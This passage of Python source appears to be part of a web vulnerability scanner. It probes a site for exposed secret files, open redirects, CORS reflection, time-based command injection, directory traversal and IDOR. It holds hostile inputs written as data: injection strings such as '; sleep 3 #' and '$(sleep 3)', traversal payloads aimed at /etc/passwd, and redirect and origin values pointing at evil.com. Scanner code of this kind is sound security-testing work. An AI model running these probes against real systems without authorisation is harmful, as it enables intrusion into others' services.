    "/v1/swagger.json", "/api/v1/swagger.json",
    "/graphql", "/graphiql", "/__graphql",
    "/debug", "/debug/pprof",
    "/metrics", "/health", "/status",
    "/.DS_Store",
    "/crossdomain.xml", "/clientaccesspolicy.xml",
]

SENSITIVE_CONTENT = [
    ("password", 9.0, "Credential exposure"),
    ("secret", 8.5, "Secret key exposure"),
    ("api_key", 8.5, "API key exposure"),
    ("aws_access", 9.5, "AWS credential exposure"),
    ("private_key", 9.5, "Private key exposure"),
    ("BEGIN RSA", 9.5, "RSA private key exposed"),
    ("DB_PASS", 8.0, "Database password exposure"),
    ("[database]", 6.0, "Database config exposure"),
]


def check_sensitive_files(base_url: str, timeout: int = 6) -> list:
    findings = []
    parsed = urlparse(base_url)
    root = f"{parsed.scheme}://{parsed.netloc}"

    for path in SENSITIVE_PATHS:
        url = root + path
        try:
            resp = SESSION.get(url, timeout=timeout, verify=False, allow_redirects=False)
            if resp.status_code in (200, 301, 302, 403):
                severity = "HIGH"
                detail = f"HTTP {resp.status_code}"
                cvss = 7.5

                if resp.status_code == 200:
                    for keyword, score, reason in SENSITIVE_CONTENT:
                        if keyword.lower() in resp.text.lower():
                            severity = "CRITICAL"
                            detail = f"HTTP 200 + sensitive content: {reason}"
                            cvss = score
                            break

                findings.append({
                    "path": path,
                    "url": url,
                    "status_code": resp.status_code,
                    "severity": severity,
                    "cvss": cvss,
                    "detail": detail,
                    "content_snippet": resp.text[:200] if resp.status_code == 200 else "",
                })
        except requests.RequestException:
            continue

    return findings


# ── Open Redirect ─────────────────────────────────────────────────────────────

REDIRECT_PAYLOADS = [
    "https://evil.com",
    "//evil.com",
    "///evil.com",
    "/\\evil.com",
    "https:evil.com",
    "javascript:alert(1)",
    "%2F%2Fevil.com",
    "http://evil.com@trusted.com",
]

REDIRECT_PARAMS = ["redirect", "return", "next", "url", "goto", "dest", "destination",
                   "redir", "redirect_uri", "redirect_url", "return_url", "forward",
                   "continue", "target", "link", "location", "ref"]


def check_open_redirect(url: str, timeout: int = 6) -> list:
    findings = []
    parsed = urlparse(url)
    existing_params = list(parse_qs(parsed.query).keys())
    test_params = existing_params + [p for p in REDIRECT_PARAMS if p not in existing_params]

    for param in test_params[:8]:
        for payload in REDIRECT_PAYLOADS[:4]:
            params = dict(parse_qs(parsed.query))
            params[param] = [payload]
            flat = {k: v[0] for k, v in params.items()}
            inject_url = parsed._replace(query=urlencode(flat)).geturl()
            try:
                resp = SESSION.get(inject_url, timeout=timeout, verify=False, allow_redirects=False)
                if resp.status_code in (301, 302, 303, 307, 308):
                    location = resp.headers.get("Location", "")
                    if "evil.com" in location or location.startswith("//") or location.startswith("\\\\"):
                        findings.append({
                            "param": param,
                            "payload": payload,
                            "url": inject_url,
                            "location": location,
                            "status_code": resp.status_code,
                            "confirmed": True,
                        })
                        break
            except requests.RequestException:
                continue

    return findings


# ── CORS Misconfiguration ─────────────────────────────────────────────────────

def check_cors(url: str, timeout: int = 6) -> dict:
    origins_to_test = [
        "https://evil.com",
        "https://attacker.com",
        "null",
        "http://localhost",
    ]
    issues = []
    for origin in origins_to_test:
        try:
            resp = SESSION.get(url, timeout=timeout, verify=False,
                               headers={"Origin": origin})
            acao = resp.headers.get("Access-Control-Allow-Origin", "")
            acac = resp.headers.get("Access-Control-Allow-Credentials", "")
            if acao == "*" and acac.lower() == "true":
                issues.append({"origin": origin, "acao": acao, "acac": acac,
                                "severity": "CRITICAL", "reason": "Wildcard CORS with credentials"})
            elif acao == origin or acao == "null":
                severity = "HIGH" if acac.lower() == "true" else "MEDIUM"
                issues.append({"origin": origin, "acao": acao, "acac": acac,
                                "severity": severity, "reason": "Origin reflected in ACAO header"})
        except requests.RequestException:
            continue
    return {"url": url, "issues": issues, "vulnerable": len(issues) > 0}


# ── Command Injection (Time-based) ────────────────────────────────────────────

CMD_PAYLOADS = [
    ("; sleep 3 #", 3.0),
    ("| sleep 3", 3.0),
    ("` sleep 3 `", 3.0),
    ("%0a sleep 3", 3.0),
    ("$(sleep 3)", 3.0),
    ("; ping -c 3 127.0.0.1 #", 3.0),
]


def check_command_injection(url: str, timeout: int = 12) -> list:
    findings = []
    parsed = urlparse(url)
    params = list(parse_qs(parsed.query).keys()) or ["q", "cmd", "exec", "input", "id", "name"]

    for param in params[:5]:
        for payload, expected_delay in CMD_PAYLOADS:
            existing = dict(parse_qs(parsed.query))
            base_val = existing.get(param, ["test"])[0]
            existing[param] = [base_val + payload]
            flat = {k: v[0] for k, v in existing.items()}
            inject_url = parsed._replace(query=urlencode(flat)).geturl()
            try:
                start = time.monotonic()
                SESSION.get(inject_url, timeout=timeout, verify=False)
                elapsed = time.monotonic() - start
                if elapsed >= expected_delay:
                    findings.append({
                        "param": param,
                        "payload": payload,
                        "url": inject_url,
                        "elapsed": round(elapsed, 2),
                        "confirmed": True,
                        "type": "time_based",
                    })
                    break
            except requests.RequestException:
                continue

    return findings


# ── Directory Traversal ───────────────────────────────────────────────────────

TRAVERSAL_PAYLOADS = [
    "../../../../etc/passwd",
    "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
    "....//....//....//etc/passwd",
    "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
    "..\\..\\..\\..\\windows\\win.ini",
    "....\\\\....\\\\windows\\win.ini",
]

TRAVERSAL_SIGS = ["root:x:0:0", "[fonts]", "[extensions]", "daemon:x:", "bin/bash", "bin/sh"]


def check_directory_traversal(url: str, timeout: int = 8) -> list:
    findings = []
    parsed = urlparse(url)
    params = list(parse_qs(parsed.query).keys()) or ["file", "path", "page", "include", "doc", "template"]

    for param in params[:5]:
        for payload in TRAVERSAL_PAYLOADS:
            existing = dict(parse_qs(parsed.query))
            existing[param] = [payload]
            flat = {k: v[0] for k, v in existing.items()}
            inject_url = parsed._replace(query=urlencode(flat)).geturl()
            try:
                resp = SESSION.get(inject_url, timeout=timeout, verify=False)
                for sig in TRAVERSAL_SIGS:
                    if sig in resp.text:
                        findings.append({
                            "param": param,
                            "payload": payload,
                            "url": inject_url,
                            "signature": sig,
                            "confirmed": True,
                        })
                        break
            except requests.RequestException:
                continue

    return findings


# ── Basic IDOR Probe ──────────────────────────────────────────────────────────

def check_idor(url: str, timeout: int = 6) -> list:
    findings = []
    parsed = urlparse(url)
    params = parse_qs(parsed.query)

    for param, values in params.items():
        original = values[0]
        if not original.isdigit():
            continue
        for alt in [str(int(original) - 1), str(int(original) + 1), "0", "1"]:
            if alt == original:
                continue
            modified = dict(params)
            modified[param] = [alt]
            flat = {k: v[0] for k, v in modified.items()}
            inject_url = parsed._replace(query=urlencode(flat)).geturl()
            try:
                orig_resp = SESSION.get(url, timeout=timeout, verify=False)
                alt_resp = SESSION.get(inject_url, timeout=timeout, verify=False)
                if (alt_resp.status_code == 200 and orig_resp.status_code == 200
                        and len(alt_resp.text) > 100
                        and abs(len(alt_resp.text) - len(orig_resp.text)) < 5000):
                    findings.append({
                        "param": param,
                        "original_value": original,
                        "tested_value": alt,
                        "url": inject_url,
                        "status_code": alt_resp.status_code,
                        "potential": True,
                        "note": "Response returned data for different ID — manual verification required",
                    })
            except requests.RequestException:
                continue

    return findings


# ── Full Web Vuln Scan ────────────────────────────────────────────────────────

def scan_web_vulns(url: str, run_sqli: bool = True, run_xss: bool = True) -> dict:
    """Run all web vulnerability checks against a URL."""
    results: dict = {"url": url, "checks": {}}

    # Security headers
    results["checks"]["headers"] = check_security_headers(url)

    # Sensitive files
    results["checks"]["sensitive_files"] = check_sensitive_files(url)

    # Open redirect
    _open_redirect_findings = check_open_redirect(url)
    results["checks"]["open_redirect"] = {
        "url": url, "findings": _open_redirect_findings,
        "vulnerable": bool(_open_redirect_findings),
    }

    # CORS
    results["checks"]["cors"] = check_cors(url)

    # Command injection
    cmdi = check_command_injection(url)
    results["checks"]["command_injection"] = {"url": url, "findings": cmdi, "vulnerable": bool(cmdi)}

    # Directory traversal
    dt = check_directory_traversal(url)
    results["checks"]["directory_traversal"] = {"url": url, "findings": dt, "vulnerable": bool(dt)}

    # IDOR
    idor = check_idor(url)
    results["checks"]["idor"] = {"url": url, "findings": idor, "potential": bool(idor)}

    # XSS (reuse existing scanner)
    if run_xss:
        try:
            from plugins.xss_scanner import scan_xss
            results["checks"]["xss"] = scan_xss(url)
        except ImportError:
            results["checks"]["xss"] = {"error": "xss_scanner not available"}

    # SQLi (reuse existing scanner)
    if run_sqli:
        try:
            from plugins.sqli_scanner import scan_sqli
            results["checks"]["sqli"] = scan_sqli(url)
        except ImportError:
            results["checks"]["sqli"] = {"error": "sqli_scanner not available"}

    # Summary
    critical_count = 0
    high_count = 0
    medium_count = 0

    for check_name, data in results["checks"].items():
        if isinstance(data, dict):
            findings = data.get("findings", [])
            if isinstance(findings, list):
                for f in findings:
                    sev = f.get("severity", "")
                    if sev == "CRITICAL":
                        critical_count += 1
                    elif sev == "HIGH":
                        high_count += 1
                    elif sev == "MEDIUM":
                        medium_count += 1
            if data.get("vulnerable") or data.get("potential"):
                if check_name in ("command_injection", "directory_traversal", "sqli"):
                    critical_count += 1
                elif check_name in ("xss", "open_redirect", "cors"):
                    high_count += 1

    results["summary"] = {
        "critical": critical_count,
        "high": high_count,
        "medium": medium_count,
        "total_checks": len(results["checks"]),
    }

    return results
